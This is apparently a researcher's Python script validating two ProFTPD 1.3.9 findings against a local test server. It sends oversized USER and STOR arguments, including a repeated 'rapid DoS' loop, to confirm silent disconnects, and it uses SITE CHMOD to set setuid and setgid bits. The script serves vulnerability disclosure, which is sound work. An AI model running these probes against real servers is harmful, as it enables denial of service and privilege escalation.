#!/usr/bin/env python3
"""
Validation script — ProFTPD CVE Submission findings
Targets: Finding 1 (Silent Disconnect / RFC 959) and Finding 4 (SITE CHMOD setuid)
Fresh reinstall: ProFTPD 1.3.9~dfsg-4 (Kali)
"""

import socket
import time
import os
import stat
import ftplib
import json

HOST = '127.0.0.1'
PORT = 21
USER = 'ftptest'
PASS = 'ftptest123'
RESULTS = {}

def banner():
    print("=" * 60)
    print("ProFTPD 1.3.9 — CVE Finding Validation")
    print("Fresh install: proftpd-core 1.3.9~dfsg-4")
    print("=" * 60)

# ─────────────────────────────────────────────────────────
# FINDING 1: Silent session disconnect / RFC 959 violation
# ─────────────────────────────────────────────────────────

def test_f1_banner():
    """Confirm we get a 220 banner from the fresh server."""
    s = socket.socket()
    s.settimeout(5)
    s.connect((HOST, PORT))
    banner_data = s.recv(512)
    s.close()
    ok = banner_data.startswith(b'220')
    print(f"\n[F1] Banner check: {banner_data[:60].decode(errors='replace').strip()}")
    print(f"     Result: {'PASS — server responding' if ok else 'FAIL — no banner'}")
    return ok, banner_data.decode(errors='replace').strip()

def test_f1_exact_threshold():
    """
    Boundary test: arg=4095 bytes → should get a real response (331/501).
    arg=4096 bytes → should get 0 bytes (RFC violation).
    """
    results = {}
    for arglen in [4095, 4096, 8192, 16384]:
        s = socket.socket()
        s.settimeout(10)
        s.connect((HOST, PORT))
        s.recv(512)  # consume banner

        payload = b"USER " + b"A" * arglen + b"\r\n"
        t0 = time.time()
        s.sendall(payload)

        response = b""
        try:
            s.settimeout(5)
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                response += chunk
                if response.endswith(b"\r\n"):
                    break
        except socket.timeout:
            pass
        elapsed = time.time() - t0
        s.close()

        label = "NORMAL (RFC OK)" if len(response) > 0 else "SILENT DROP (RFC VIOLATION)"
        results[arglen] = {
            'response_bytes': len(response),
            'response_preview': response[:80].decode(errors='replace').strip(),
            'elapsed_s': round(elapsed, 2),
            'label': label
        }
        print(f"     USER arg={arglen:>6}B → response={len(response):>3}B  {label}  ({elapsed:.2f}s)")

    return results

def test_f1_preauth():
    """
    Pre-authentication test: no login, just send oversized USER.
    Finding claims: 0 bytes response, TCP EOF.
    """
    print("\n[F1] Pre-auth silent disconnect test")
    print("     Sending USER with 16384-byte argument (no credentials)...")
    s = socket.socket()
    s.settimeout(10)
    s.connect((HOST, PORT))
    s.recv(512)

    s.sendall(b"USER " + b"A" * 16384 + b"\r\n")
    response = b""
    try:
        s.settimeout(5)
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            response += chunk
    except socket.timeout:
        pass
    s.close()

    rfc_violation = len(response) == 0
    print(f"     Response bytes: {len(response)}")
    print(f"     RFC 959 violation confirmed: {rfc_violation}")
    if rfc_violation:
        print("     FINDING 1 VALIDATED — server closes connection with zero bytes")
    else:
        print(f"     NOT confirmed — server sent: {response[:80].decode(errors='replace')}")

    return rfc_violation, len(response)

def test_f1_postauth():
    """
    Post-auth test: login, then send STOR with 16384-byte arg.
    """
    print("\n[F1] Post-auth silent disconnect test (STOR)")
    try:
        s = socket.socket()
        s.settimeout(5)
        s.connect((HOST, PORT))
        s.recv(512)

        # Authenticate
        s.sendall(b"USER ftptest\r\n")
        r = s.recv(512)
        if not r.startswith(b"331"):
            print(f"     Skipping — USER response: {r[:40]}")
            s.close()
            return None, None
        s.sendall(b"PASS ftptest123\r\n")
        r = s.recv(512)
        if not r.startswith(b"230"):
            print(f"     Skipping — PASS response: {r[:40]}")
            s.close()
            return None, None

        print("     Authenticated OK, sending STOR with 16384-byte filename...")
        s.sendall(b"STOR " + b"B" * 16384 + b"\r\n")

        response = b""
        try:
            s.settimeout(5)
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                response += chunk
        except socket.timeout:
            pass
        s.close()

        rfc_violation = len(response) == 0
        print(f"     Response bytes: {len(response)}")
        print(f"     RFC violation (post-auth): {rfc_violation}")
        return rfc_violation, len(response)

    except Exception as e:
        print(f"     Error: {e}")
        return None, str(e)

def test_f1_rapid_dos(n=5):
    """
    Rapid DoS: n sessions, each sending oversized USER, verify all get 0 bytes.
    (Reduced from 20 to 5 for quick validation.)
    """
    print(f"\n[F1] Rapid DoS test ({n} sessions)...")
    drops = 0
    times = []
    for i in range(n):
        s = socket.socket()
        s.settimeout(10)
        s.connect((HOST, PORT))
        s.recv(512)
        s.sendall(b"USER " + b"A" * 16384 + b"\r\n")
        t0 = time.time()
        response = b""
        try:
            s.settimeout(5)
            while True:
                c = s.recv(4096)
                if not c:
                    break
                response += c
        except socket.timeout:
            pass
        elapsed = time.time() - t0
        times.append(round(elapsed, 2))
        if len(response) == 0:
            drops += 1
        s.close()

    print(f"     Silent drops: {drops}/{n}")
    print(f"     Times: {times}")
    return drops, n, times

# ─────────────────────────────────────────────────────────
# FINDING 4: SITE CHMOD setuid/setgid bit setting
# ─────────────────────────────────────────────────────────

def test_f4_setup():
    """Create a test file in ftptest home that we can chmod."""
    testfile = '/home/ftptest/validate_chmod_target'
    try:
        with open(testfile, 'w') as f:
            f.write('chmod validation target\n')
        os.chmod(testfile, 0o644)
        print(f"\n[F4] Test file created: {testfile} (mode 0o644)")
        return testfile
    except PermissionError:
        # Try via sudo
        import subprocess
        subprocess.run(['sudo', '-u', 'ftptest', 'sh', '-c',
                        f'echo test > {testfile} && chmod 644 {testfile}'],
                       check=True)
        print(f"\n[F4] Test file created via sudo: {testfile}")
        return testfile

def test_f4_chmod_cases(testfile):
    """
    Test SITE CHMOD with various modes including setuid/setgid.
    Verify actual inode mode via os.stat().
    """
    test_cases = [
        ('777',  0o100777, 'world-writable'),
        ('4755', 0o104755, 'setuid + rwxr-xr-x'),
        ('6755', 0o106755, 'setuid + setgid + rwxr-xr-x'),
        ('4777', 0o104777, 'setuid + rwxrwxrwx'),
        ('644',  0o100644, 'restore to safe mode'),
    ]

    results = {}
    print("\n[F4] SITE CHMOD test cases:")
    print(f"     {'Mode':<6} {'Response':<40} {'Actual inode mode':<20} {'Expected':<12} {'Match'}")
    print(f"     {'-'*4} {'-'*38} {'-'*18} {'-'*10} {'-'*5}")

    try:
        ftp = ftplib.FTP()
        ftp.connect(HOST, PORT, timeout=10)
        ftp.login(USER, PASS)

        for mode_str, expected_mode, label in test_cases:
            target = testfile
            try:
                resp = ftp.sendcmd(f'SITE CHMOD {mode_str} {target}')
                # Read actual mode from inode
                actual = stat.S_IMODE(os.stat(target).st_mode)
                # Reconstruct full mode with file type bits
                full_actual = os.stat(target).st_mode
                match = oct(full_actual) == oct(expected_mode)

                results[mode_str] = {
                    'response': resp,
                    'expected_mode': oct(expected_mode),
                    'actual_mode': oct(full_actual),
                    'match': match,
                    'label': label
                }

                print(f"     {mode_str:<6} {resp:<40} {oct(full_actual):<20} {oct(expected_mode):<12} {'✓' if match else '✗'}")

            except Exception as e:
                results[mode_str] = {'error': str(e)}
                print(f"     {mode_str:<6} ERROR: {e}")

        ftp.quit()

    except Exception as e:
        print(f"     FTP connection error: {e}")
        return None

    # Clean up: reset file to safe mode
    try:
        os.chmod(testfile, 0o644)
    except Exception:
        pass

    return results

def test_f4_setuid_confirmed(chmod_results):
    """Check whether setuid (4755) was confirmed."""
    if not chmod_results or '4755' not in chmod_results:
        return False
    r = chmod_results['4755']
    confirmed = (r.get('match') and '200' in r.get('response', ''))
    if confirmed:
        print("\n[F4] FINDING 4 VALIDATED — SITE CHMOD 4755 sets setuid bit")
        print(f"     Response: {r.get('response')}")
        print(f"     Actual mode: {r.get('actual_mode')} (expected {r.get('expected_mode')})")
    else:
        print("\n[F4] FINDING 4 NOT confirmed for 4755")
        print(f"     Data: {r}")
    return confirmed

# ─────────────────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────────────────

def main():
    banner()

    print("\n" + "─"*60)
    print("FINDING 1: Silent Session Disconnect / RFC 959 Violation")
    print("─"*60)

    ok, banner_text = test_f1_banner()
    RESULTS['f1_banner'] = {'ok': ok, 'banner': banner_text}

    print("\n[F1] Boundary threshold test (argument length sweep):")
    threshold_results = test_f1_exact_threshold()
    RESULTS['f1_threshold'] = threshold_results

    f1_preauth, f1_preauth_bytes = test_f1_preauth()
    RESULTS['f1_preauth'] = {'rfc_violation': f1_preauth, 'response_bytes': f1_preauth_bytes}

    f1_postauth, f1_postauth_bytes = test_f1_postauth()
    RESULTS['f1_postauth'] = {'rfc_violation': f1_postauth, 'response_bytes': f1_postauth_bytes}

    dos_drops, dos_total, dos_times = test_f1_rapid_dos(n=5)
    RESULTS['f1_rapid_dos'] = {'drops': dos_drops, 'total': dos_total, 'times': dos_times}

    print("\n" + "─"*60)
    print("FINDING 4: SITE CHMOD setuid/setgid Bit Manipulation")
    print("─"*60)

    testfile = test_f4_setup()
    chmod_results = test_f4_chmod_cases(testfile)
    RESULTS['f4_chmod'] = chmod_results
    f4_confirmed = test_f4_setuid_confirmed(chmod_results)
    RESULTS['f4_setuid_confirmed'] = f4_confirmed

    # ── Summary ──
    print("\n" + "="*60)
    print("VALIDATION SUMMARY")
    print("="*60)

    f1_verdict = f1_preauth is True
    print(f"\n  Finding 1 (RFC 959 Silent Disconnect): {'CONFIRMED ✓' if f1_verdict else 'NOT CONFIRMED ✗'}")
    if threshold_results:
        for l, r in sorted(threshold_results.items()):
            print(f"    arg={l}B → {r['response_bytes']}B response  [{r['label']}]")
    print(f"    Rapid DoS: {dos_drops}/{dos_total} silent drops")

    print(f"\n  Finding 4 (SITE CHMOD setuid): {'CONFIRMED ✓' if f4_confirmed else 'NOT CONFIRMED ✗'}")
    if chmod_results:
        for m, r in chmod_results.items():
            if 'error' not in r:
                print(f"    CHMOD {m:>4}: {r.get('response','')[:35]:<36} mode={r.get('actual_mode')}  match={r.get('match')}")

    # Save results to evidence
    evidence_path = '/home/[REDACTED]/Desktop/[REDACTED-PATH]/ProFTPD/evidence/validation_fresh_install.json'
    import datetime
    output = {
        'timestamp': datetime.datetime.now().isoformat(),
        'target': 'ProFTPD 1.3.9~dfsg-4 (fresh reinstall)',
        'host': HOST,
        'port': PORT,
        'findings': RESULTS
    }
    with open(evidence_path, 'w') as f:
        json.dump(output, f, indent=2)
    print(f"\n  Evidence saved: {evidence_path}")

if __name__ == '__main__':
    main()
